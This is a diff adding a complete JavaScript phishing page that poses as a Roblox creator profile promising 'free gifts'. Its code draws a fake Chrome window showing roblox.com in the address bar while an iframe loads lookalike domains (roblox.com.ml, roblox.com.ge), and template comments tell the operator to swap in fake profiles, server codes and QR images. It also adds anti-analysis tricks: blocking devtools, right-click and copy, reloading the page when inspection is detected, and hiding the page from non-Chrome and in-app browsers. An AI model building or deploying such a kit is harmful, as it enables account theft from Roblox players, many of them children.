@@ -1,0 +1,839 @@
+// ============================================
+//      ALL-IN-ONE SCRIPT (JAVA/HTML/CSSS)
+// ============================================
+(function() {
+    'use strict';
+
+    // ========================================
+    //    CHECK BROWSER (ONLY CHROME WORKS)
+    // ========================================
+    var ua = navigator.userAgent;
+    var isChromeiOS = /CriOS/.test(ua);
+    var isRealChrome = false;
+    if (ua.indexOf('Chrome') > -1 || isChromeiOS) {
+        if (ua.indexOf('Edg') === -1) {
+            if (ua.indexOf('OPR') === -1) {
+                if (ua.indexOf('Brave') === -1) {
+                    if (ua.indexOf('Vivaldi') === -1) {
+                        if (navigator.vendor && navigator.vendor.indexOf('Google') > -1) {
+                            isRealChrome = true;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    var isSafari = /Safari/.test(ua) && /AppleWebKit/.test(ua) && !/Chrome/.test(ua) && !/Edg/.test(ua) && !/CriOS/.test(ua) && !/FBAN/.test(ua);
+    var isInApp = /TikTok|Instagram|FBAN|FBAV|Line|WhatsApp|Messenger/.test(ua);
+
+    if (!isRealChrome || isInApp || isSafari) {
+        var currentUrl = window.location.href;
+        
+        document.documentElement.innerHTML = '';
+        document.body = document.createElement('body');
+        document.documentElement.appendChild(document.body);
+        
+        document.body.style.cssText = `
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #0a0a1a;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        `;
+
+        var container = document.createElement('div');
+        container.style.cssText = `
+            background: #1a1a2e;
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border: 1px solid #E81F76;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        `;
+        container.innerHTML = `
+            <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
+            <h2 style="color:white;">Optimized for <span style="color:#E81F76;">Google Chrome</span></h2>
+            <p style="color:#aaa;margin:20px 0;line-height:1.6;">Please open this site in <strong style="color:#E81F76;">Google Chrome</strong> for the best experience.</p>
+            <div style="background:#0d0f17;padding:12px;border-radius:10px;margin:20px 0;word-break:break-all;">
+                <code style="color:#E81F76;font-size:13px;">${currentUrl}</code>
+            </div>
+            <button onclick="navigator.clipboard.writeText('${currentUrl}')" style="background:#E81F76;border:none;padding:10px 30px;border-radius:25px;color:white;cursor:pointer;font-weight:bold;">Copy Link</button>
+        `;
+        document.body.appendChild(container);
+        return;
+    }
+
+    // ===============
+    //  ANTI-INSPECT 
+    // ===============
+    document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12') {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && e.key === 'u') {
+            e.preventDefault();
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.key === 'L') {
+            e.preventDefault();
+            return false;
+        }
+        return true;
+    });
+
+    // =================
+    //  ANTI DEVTOOLS
+    // =================
+    var devtoolsOpen = false;
+    function detectDevTools() {
+        var widthThreshold = window.outerWidth - window.innerWidth > 160;
+        var heightThreshold = window.outerHeight - window.innerHeight > 160;
+        return widthThreshold || heightThreshold;
+    }
+    setInterval(function() {
+        if (detectDevTools()) {
+            if (!devtoolsOpen) {
+                devtoolsOpen = true;
+                var container = document.querySelector('.container');
+                if (container) {
+                    container.style.filter = 'blur(8px)';
+                    container.style.pointerEvents = 'none';
+                    container.style.transition = '0.5s';
+                    
+                    var overlay = document.createElement('div');
+                    overlay.id = 'loading-overlay';
+                    overlay.style.cssText = `
+                        position: fixed;
+                        top: 0;
+                        left: 0;
+                        width: 100%;
+                        height: 100%;
+                        background: rgba(15, 12, 41, 0.85);
+                        display: flex;
+                        flex-direction: column;
+                        justify-content: center;
+                        align-items: center;
+                        z-index: 9999;
+                        font-family: 'Segoe UI', sans-serif;
+                        color: white;
+                        backdrop-filter: blur(10px);
+                        animation: fadeInOverlay 0.5s ease;
+                    `;
+                    overlay.innerHTML = `
+                        <div style="
+                            width: 50px;
+                            height: 50px;
+                            border: 4px solid rgba(255,255,255,0.1);
+                            border-top: 4px solid #4285f4;
+                            border-radius: 50%;
+                            animation: spin 1s linear infinite;
+                            margin-bottom: 20px;
+                        "></div>
+                        <p style="opacity:0.7;font-size:14px;letter-spacing:1px;">Reloading content...</p>
+                        <p style="opacity:0.3;font-size:11px;margin-top:10px;">Please wait a moment</p>
+                    `;
+                    document.body.appendChild(overlay);
+
+                    var styleAnim = document.createElement('style');
+                    styleAnim.textContent = `
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                        @keyframes fadeInOverlay {
+                            0% { opacity: 0; }
+                            100% { opacity: 1; }
+                        }
+                    `;
+                    document.head.appendChild(styleAnim);
+
+                    setTimeout(function() {
+                        location.reload();
+                    }, 3000);
+                }
+            }
+        } else {
+            devtoolsOpen = false;
+        }
+    }, 500);
+
+    // ================================
+    //  CONTENT WEBSITE (CSS + HTML)
+    // ================================
+    var style = document.createElement('style');
+    style.textContent = `
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
+            padding: 20px;
+            background: radial-gradient(circle at 30% 20%, #1a0a24 0%, #0b0512 55%, #060309 100%);
+            overflow: hidden;
+        }
+
+        /* ===== DOT PARTICLES ===== */
+        .dot {
+            position: fixed;
+            width: 3px;
+            height: 3px;
+            border-radius: 50%;
+            background: #ff4800;
+            opacity: 0.5;
+            pointer-events: none;
+            animation: float 6s ease-in-out infinite;
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); opacity: 0.25; }
+            50% { transform: translateY(-14px); opacity: 0.7; }
+        }
+
+        /* ===== STAGE ===== */
+        .stage {
+            position: relative;
+            width: 100%;
+            max-width: 380px;
+            z-index: 1;
+        }
+
+        /* ===== VOLTAGE RING ===== */
+        .voltage-wrap {
+            position: absolute;
+            inset: -3px;
+            border-radius: 26px;
+            padding: 3px;
+            overflow: hidden;
+            z-index: 0;
+        }
+        .voltage-wrap::before {
+            content: "";
+            position: absolute;
+            inset: -60%;
+            background: conic-gradient(
+                from 0deg,
+                transparent 0deg,
+                transparent 40deg,
+                #585858 55deg,
+                #b6aeae 65deg,
+                #c2bfbf 75deg,
+                transparent 95deg,
+                transparent 190deg,
+                #585858 205deg,
+                #b6aeae 215deg,
+                #c2bfbf 225deg,
+                transparent 245deg,
+                transparent 360deg
+            );
+            animation: spin 3.2s linear infinite;
+            filter: blur(2px);
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .voltage-mask {
+            position: absolute;
+            inset: 3px;
+            border-radius: 24px;
+            background: #0b0512;
+        }
+
+        .voltage-glow {
+            position: absolute;
+            inset: -18px;
+            border-radius: 34px;
+            z-index: -1;
+            background: radial-gradient(circle, rgba(255,46,136,0.35), transparent 70%);
+            animation: pulse 1.6s ease-in-out infinite;
+            filter: blur(10px);
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 0.35; transform: scale(0.97); }
+            50% { opacity: 0.85; transform: scale(1.03); }
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: linear-gradient(180deg, #150a1f 0%, #100616 100%);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 90, 160, 0.25);
+            padding: 28px 26px 22px;
+            text-align: center;
+            color: #f2e9f2;
+            box-shadow: 0 0 40px rgba(214, 26, 255, 0.12), inset 0 0 40px rgba(255, 46, 136, 0.03);
+        }
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            letter-spacing: 1.5px;
+            font-weight: 700;
+            color: #ff6fb0;
+            background: rgba(255, 46, 136, 0.12);
+            border: 1px solid rgba(255, 90, 160, 0.35);
+            padding: 5px 14px;
+            border-radius: 20px;
+            margin-bottom: 22px;
+        }
+
+        .avatar-wrap {
+            position: relative;
+            width: 96px;
+            height: 96px;
+            margin: 0 auto 16px;
+        }
+        .avatar-ring {
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            background: conic-gradient(from 0deg, #000000f6, #e91102, #ff7300);
+            animation: spin 4s linear infinite;
+        }
+        .avatar {
+            position: relative;
+            width: 96px;
+            height: 96px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 30%, #3a2050, #150a1f 70%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 3px solid #0b0512;
+        }
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(1.2);
+        }
+
+        .status-dot {
+            position: absolute;
+            bottom: 2px;
+            right: 2px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #17c964;
+            border: 3px solid #150a1f;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .status-dot img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .username {
+            font-size: 21px;
+            font-weight: 800;
+            background: linear-gradient(90deg, #ff0000, #ff2e88);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 4px;
+        }
+        .handle {
+            font-size: 13px;
+            color: #8a7a92;
+            margin-bottom: 8px;
+        }
+        .tag {
+            font-size: 12px;
+            color: #ff6fb0;
+            font-weight: 600;
+            margin-bottom: 16px;
+        }
+        .divider {
+            width: 50px;
+            height: 2px;
+            background: #bd0000;
+            margin: 0 auto 18px;
+            border-radius: 2px;
+            opacity: 0.8;
+            box-shadow: 0 0 15px rgba(255,46,136,0.5);
+        }
+
+        .link-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: rgba(255, 46, 136, 0.07);
+            border: 1px solid rgba(255, 90, 160, 0.18);
+            border-radius: 14px;
+            padding: 12px 16px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: background 0.2s ease, border-color 0.2s ease;
+        }
+        .link-row:hover {
+            background: rgba(255, 46, 136, 0.14);
+            border-color: rgba(255, 90, 160, 0.4);
+        }
+        .link-icon {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .link-icon.roblox { background: linear-gradient(135deg, #ff2e88, #7a1aff); }
+        .link-icon.lock { background: linear-gradient(135deg, #2a2440, #1a1530); }
+        .link-icon svg { width: 17px; height: 17px; }
+        .link-label {
+            font-size: 14px;
+            font-weight: 600;
+            color: #f2e9f2;
+            flex: 1;
+            text-align: left;
+        }
+        .link-arrow { color: #8a7a92; font-size: 16px; }
+
+        .qr-section {
+            margin-top: 20px;
+            border: 1px solid rgba(255, 90, 160, 0.15);
+            border-radius: 16px;
+            padding: 18px;
+        }
+        .qr-label {
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: #8a7a92;
+            margin-bottom: 14px;
+        }
+        .qr-box {
+            width: 150px;
+            height: 150px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 10px;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 4px;
+        }
+
+        .footer {
+            margin-top: 16px;
+            font-size: 11px;
+            color: #6a5c72;
+        }
+        .footer span { color: #c9c2c6; }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .stage { max-width: 100%; }
+            .card { padding: 20px 18px 18px; }
+            .avatar-wrap { width: 80px; height: 80px; }
+            .avatar { width: 80px; height: 80px; }
+            .username { font-size: 18px; }
+            .qr-box { width: 120px; height: 120px; }
+
+            .modal-overlay .browser-window iframe {
+                min-height: 300px !important;
+                max-height: 65vh !important;
+            }
+            .modal-overlay .browser-window > div:last-child {
+                min-height: 300px !important;
+                max-height: 65vh !important;
+            }
+        }
+    `;
+    document.head.appendChild(style);
+
+    // ==================
+    //   DOT PARTICLES
+    // ==================
+    for (var i = 0; i < 18; i++) {
+        var d = document.createElement('div');
+        d.className = 'dot';
+        d.style.left = Math.random() * 100 + 'vw';
+        d.style.top = Math.random() * 100 + 'vh';
+        d.style.animationDelay = (Math.random() * 4) + 's';
+        d.style.animationDuration = (4 + Math.random() * 4) + 's';
+        document.body.appendChild(d);
+    }
+
+    // ==========
+    //  QR CODE
+    // ==========
+    function generateQR() {
+        var size = 21;
+        var cell = 100 / size;
+        var seedGrid = [];
+        for (var y = 0; y < size; y++) {
+            seedGrid.push([]);
+            for (var x = 0; x < size; x++) {
+                var inFinder = (x < 7 && y < 7) || (x > size - 8 && y < 7) || (x < 7 && y > size - 8);
+                seedGrid[y].push(inFinder ? 0 : Math.random() > 0.55 ? 1 : 0);
+            }
+        }
+        
+        var svg = '<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">';
+        svg += '<rect width="100" height="100" fill="white"/>';
+        
+        for (var y = 0; y < size; y++) {
+            for (var x = 0; x < size; x++) {
+                if (seedGrid[y][x]) {
+                    svg += '<rect x="' + (x*cell) + '" y="' + (y*cell) + '" width="' + cell + '" height="' + cell + '" fill="#000"/>';
+                }
+            }
+        }
+        
+        function drawFinder(gx, gy) {
+            svg += '<rect x="' + (gx*cell) + '" y="' + (gy*cell) + '" width="' + (7*cell) + '" height="' + (7*cell) + '" fill="#000"/>';
+            svg += '<rect x="' + ((gx+1)*cell) + '" y="' + ((gy+1)*cell) + '" width="' + (5*cell) + '" height="' + (5*cell) + '" fill="#fff"/>';
+            svg += '<rect x="' + ((gx+2)*cell) + '" y="' + ((gy+2)*cell) + '" width="' + (3*cell) + '" height="' + (3*cell) + '" fill="#000"/>';
+        }
+        
+        drawFinder(0, 0);
+        drawFinder(size - 7, 0);
+        drawFinder(0, size - 7);
+        svg += '</svg>';
+        return svg;
+    }
+
+    // ===============================
+    //  MODAL IFRAME (CHROME STYLE)
+    // ===============================
+    
+    var modalOverlay = document.createElement('div');
+    modalOverlay.className = 'modal-overlay';
+    modalOverlay.id = 'iframeModal';
+    modalOverlay.style.cssText = `
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.92);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+    `;
+    modalOverlay.innerHTML = `
+        <div style="background:#202124;border-radius:12px;max-width:1100px;width:100%;max-height:90vh;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.9);border:1px solid rgba(255,255,255,0.05);display:flex;flex-direction:column;">
+            <div style="background:#202124;padding:8px 12px 0 12px;display:flex;align-items:center;gap:2px;flex-shrink:0;border-bottom:1px solid #3c4043;">
+                <div style="background:#2b2d30;color:#9aa0a6;padding:6px 16px;border-radius:8px 8px 0 0;font-size:12px;font-weight:500;display:flex;align-items:center;gap:8px;border:1px solid #3c4043;border-bottom:1px solid #202124;background:#202124;color:#e8eaed;">
+                    <div style="width:18px;height:18px;background:#0e42ff;border-radius:4.5px;display:grid;place-items:center;flex-shrink:0;">
+                        <div style="width:10px;height:10px;background:white;transform:rotate(15deg);display:grid;place-items:center;">
+                            <div style="width:3.2px;height:3.2px;background:#0081ff;"></div>
+                        </div>
+                    </div>
+                    <span id="tabTitle">Roblox</span>
+                    <span id="tabCloseBtn" style="margin-left:auto;opacity:0.5;font-size:14px;cursor:pointer;padding:0 4px;">✕</span>
+                </div>
+                <div style="margin-left:auto;display:flex;gap:14px;color:#9aa0a6;font-size:14px;padding-left:12px;">
+                    <span>─</span>
+                    <span>☐</span>
+                    <span id="modalCloseBtn" style="font-size:20px;cursor:pointer;transition:0.3s;">✕</span>
+                </div>
+            </div>
+            <div style="background:#202124;padding:6px 14px 10px 14px;display:flex;align-items:center;gap:12px;flex-shrink:0;border-bottom:1px solid #3c4043;">
+                <div style="display:flex;gap:12px;color:#9aa0a6;font-size:18px;">
+                    <span>←</span>
+                    <span>→</span>
+                    <span>⟳</span>
+                </div>
+                <div style="flex:1;background:#2b2d30;border-radius:20px;padding:6px 16px;display:flex;align-items:center;gap:10px;border:1px solid #3c4043;color:#e8eaed;font-size:13px;">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='14' height='14' viewBox='0 0 24 24' fill='none' stroke='%239aa0a6' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Crect x='3' y='11' width='18' height='11' rx='2' ry='2'/%3E%3Cpath d='M7 11V7a5 5 0 0 1 10 0v4'/%3E%3C/svg%3E" style="width:14px;height:14px;">
+                    <span id="urlDisplay" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#e8eaed;">roblox.com</span>
+                </div>
+                <div style="display:flex;align-items:center;gap:10px;color:#9aa0a6;">
+                    <span>☆</span>
+                    <div style="width:28px;height:28px;border-radius:50%;overflow:hidden;display:flex;align-items:center;justify-content:center;background:transparent;">
+                        <img src="GuestProfile.png" style="width:35px;height:35px;object-fit:contain;filter:brightness(15);">
+                    </div>
+                    <span style="font-size:18px;cursor:default;">⋮</span>
+                </div>
+            </div>
+            <div style="flex:1;background:#fff;position:relative;min-height:400px;max-height:75vh;overflow:hidden;">
+                <div id="modalLoading" style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#666;">
+                    <div style="width:40px;height:40px;border:3px solid rgba(232,31,118,0.1);border-top:3px solid #bd0b0b;border-radius:50%;animation:spinnerRotate 1s linear infinite;margin:0 auto 12px;"></div>
+                    <p style="font-size:14px;color:#999;">Loading...</p>
+                </div>
+                <iframe id="modalIframe" src="about:blank" style="width:100%;height:100%;min-height:400px;max-height:75vh;border:none;display:none;" allow="fullscreen" sandbox="allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"></iframe>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(modalOverlay);
+
+    // Style Spinner
+    var spinnerStyle = document.createElement('style');
+    spinnerStyle.textContent = `
+        @keyframes spinnerRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    `;
+    document.head.appendChild(spinnerStyle);
+
+    var modalIframe = document.getElementById('modalIframe');
+    var modalLoading = document.getElementById('modalLoading');
+    var modalCloseBtn = document.getElementById('modalCloseBtn');
+    var tabCloseBtn = document.getElementById('tabCloseBtn');
+    var tabTitle = document.getElementById('tabTitle');
+    var urlDisplay = document.getElementById('urlDisplay');
+
+    // ===============
+    //  OPEN MODAL
+    // ===============
+    function openModal(iframeUrl, title, type, displayUrl) {
+        modalOverlay.style.display = 'flex';
+        tabTitle.textContent = title || 'Roblox';
+        
+        var displayUrlFormatted = displayUrl ? displayUrl.replace('https://', '').replace('http://', '') : iframeUrl.replace('https://', '').replace('http://', '');
+        if (displayUrlFormatted.length > 40) {
+            displayUrlFormatted = displayUrlFormatted.substring(0, 40) + '...';
+        }
+        urlDisplay.textContent = displayUrlFormatted;
+        urlDisplay.style.color = '#e8eaed';
+        
+        modalLoading.style.display = 'block';
+        modalIframe.style.display = 'none';
+        modalIframe.src = iframeUrl;
+        
+        modalIframe.onload = function() {
+            modalLoading.style.display = 'none';
+            modalIframe.style.display = 'block';
+        };
+        
+        setTimeout(function() {
+            if (modalLoading.style.display !== 'none') {
+                modalLoading.innerHTML = `
+                    <p style="color:#aaa;">Loading...</p>
+                    <p style="color:#666;font-size:12px;margin-top:8px;">${iframeUrl}</p>
+                `;
+            }
+        }, 5000);
+    }
+
+    function closeModal() {
+        modalOverlay.style.display = 'none';
+        setTimeout(function() {
+            modalIframe.src = 'about:blank';
+            modalLoading.style.display = 'block';
+            modalLoading.innerHTML = `
+                <div style="width:40px;height:40px;border:3px solid rgba(232,31,118,0.1);border-top:3px solid #d30101;border-radius:50%;animation:spinnerRotate 1s linear infinite;margin:0 auto 12px;"></div>
+                <p style="font-size:14px;color:#999;">Loading...</p>
+            `;
+            modalIframe.style.display = 'none';
+            tabTitle.textContent = 'Roblox';
+            urlDisplay.textContent = 'roblox.com';
+        }, 300);
+    }
+
+    modalCloseBtn.addEventListener('click', closeModal);
+    tabCloseBtn.addEventListener('click', closeModal);
+
+    modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) {
+            closeModal();
+        }
+    });
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && modalOverlay.style.display === 'flex') {
+            closeModal();
+        }
+    });
+
+    // ==================
+    //  MAIN CONTAINER
+    // =================
+    var USER_ID = '4795853835'; // Drop a Valid User ID to Get the Headshot
+    var USERNAME = 'obozirax'; // Switch Up Any Username
+    var HANDLE = '@obozirax'; // Swap the Fake Roblox User
+    var PRIVATE_CODE = '0e86702dd4ca033577d93a50083'; // Swap the Fake PS Code
+    var TYPING_TEXT = 'OPEN TRADE/UPGRADE/FREE GIFT. JUST JOIN ME'; // Slap it under the QR code
+
+    // STAGE
+    var stage = document.createElement('div');
+    stage.className = 'stage';
+
+    // Voltage Glow
+    var voltageGlow = document.createElement('div');
+    voltageGlow.className = 'voltage-glow';
+    stage.appendChild(voltageGlow);
+
+    // Voltage Wrap
+    var voltageWrap = document.createElement('div');
+    voltageWrap.className = 'voltage-wrap';
+    var voltageMask = document.createElement('div');
+    voltageMask.className = 'voltage-mask';
+    voltageWrap.appendChild(voltageMask);
+    stage.appendChild(voltageWrap);
+
+    // Card
+    var card = document.createElement('div');
+    card.className = 'card';
+    card.innerHTML = `
+        <div class="badge">✦ ROBLOX</div>
+
+        <div class="avatar-wrap">
+            <div class="avatar-ring"></div>
+            <div class="avatar">
+                <img src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-9C38296AFA11FFD143E25AA59A0C8B6C-Png/150/150/AvatarHeadshot/Webp/noFilter" alt="Roblox Avatar">
+            </div>
+            <div class="status-dot">
+                <img src="StatusGame.png" alt="status">
+            </div>
+        </div>
+
+        <div class="username">${USERNAME}</div>
+        <div class="handle">${HANDLE}</div>
+        <div class="tag">Content Creator</div>
+        <div style="display:flex;align-items:center;justify-content:center;margin:0 auto 12px;height:50px;width:100%;flex-shrink:0;">
+            <img src="CatJump.gif" alt="divider" style="width:130px;height:50px;object-fit:contain;border-radius:4px;flex-shrink:0;">
+        </div>
+
+        <div class="link-row" id="profileLink">
+            <div class="link-icon roblox">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="1.8">
+                    <circle cx="12" cy="7" r="3"></circle>
+                    <path d="M5 21c0-3.9 3.1-7 7-7s7 3.1 7 7"></path>
+                </svg>
+            </div>
+            <div class="link-label">Profile Roblox</div>
+            <div class="link-arrow">→</div>
+        </div>
+
+        <div class="link-row" id="privateLink">
+            <div class="link-icon lock">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#ffb347" stroke-width="1.8">
+                    <rect x="5" y="11" width="14" height="9" rx="2"></rect>
+                    <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
+                </svg>
+            </div>
+            <div class="link-label">Private Server</div>
+            <div class="link-arrow">→</div>
+        </div>
+
+        <div class="qr-section">
+            <div class="qr-label">SCAN QR PROFILE</div>
+            <div class="qr-box" id="qrBox"></div>
+        </div>
+        <div class="footer" style="margin-top:16px;font-size:10px;letter-spacing:1px;color:#6a5c72;display:flex;align-items:center;justify-content:center;gap:6px;font-family:'Courier New',monospace;">
+            <span id="typedText" style="opacity:0.8;"></span>
+            <span id="cursorBlink" style="animation:blink 0.8s step-end infinite;opacity:0.5;">_</span>
+        </div>
+    `;
+
+    stage.appendChild(card);
+    document.body.appendChild(stage);
+
+    // ===============
+    //  TYPING EFFECT
+    // ================
+    var typedText = document.getElementById('typedText');
+    var cursorBlink = document.getElementById('cursorBlink');
+    var fullText = TYPING_TEXT;
+    var charIndex = 0;
+    var isDeleting = false;
+
+    function typeEffect() {
+        if (!isDeleting) {
+            if  (charIndex < fullText.length) {
+                typedText.textContent += fullText.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeEffect, 80 + Math.random() * 40);
+            } else {
+                setTimeout(function() {
+                    isDeleting = true;
+                    setTimeout(typeEffect, 100);
+                }, 2000);
+            }
+        } else {
+            if (charIndex > 0) {
+                typedText.textContent = fullText.substring(0, charIndex - 1);
+                charIndex--;
+                setTimeout(typeEffect, 40 + Math.random() * 30);
+            } else {
+                isDeleting = false;
+                setTimeout(typeEffect, 500);
+            }
+        }
+    }
+    setTimeout(typeEffect, 1000);
+
+    // =======================================================
+    //  GENERATE FAKE QR CODE (CHANGE WITH YOUR FAKE QR CODE)
+    // =======================================================
+    var qrBox = document.getElementById('qrBox');
+    qrBox.innerHTML = '<img src="QR.png" alt="QR Code" style="width:100%;height:100%;object-fit:contain;border-radius:4px;">';
+
+    // ========================
+    //  EVENT LISTENER LINK
+    // ========================
+    
+    var DISPLAY_PROFILE_URL = 'https://roblox.com/users/4795853835/profile';
+    var DISPLAY_PRIVATE_URL = 'https://www.roblox.com/share?code=0e86702dd4ca033577d93a50083&type=Server';
+
+    var IFRAME_PROFILE_URL = 'https://www.roblox.com.ml/users/456426388441/profile'; // CHANGE WITH YOUR FAKE PROFILE
+    var IFRAME_PRIVATE_URL = 'https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=23369446793053366929440549689888'; // CHANGE WITH YOUR FAKE PS
+
+    document.getElementById('profileLink').addEventListener('click', function() {
+        openModal(IFRAME_PROFILE_URL, 'Roblox Profile', 'profile', DISPLAY_PROFILE_URL);
+    });
+
+    document.getElementById('privateLink').addEventListener('click', function() {
+        openModal(IFRAME_PRIVATE_URL, 'Private Server', 'private', DISPLAY_PRIVATE_URL);
+    });
+
+    // =============================
+    //  BLOCK COPY / CUT / PASTE
+    // =============================
+    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('paste', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('dragover', function(e) { e.preventDefault(); return false; });
+    document.addEventListener('drop', function(e) { e.preventDefault(); return false; });
+
+    console.log('%cWebsite Loaded Successfully!', 'font-size:18px;color:#00ff88;');
+    console.log('%cProfile: ' + IFRAME_PROFILE_URL, 'color:#E81F76;');
+    console.log('%cPrivate: ' + IFRAME_PRIVATE_URL, 'color:#4285f4;');
+})();
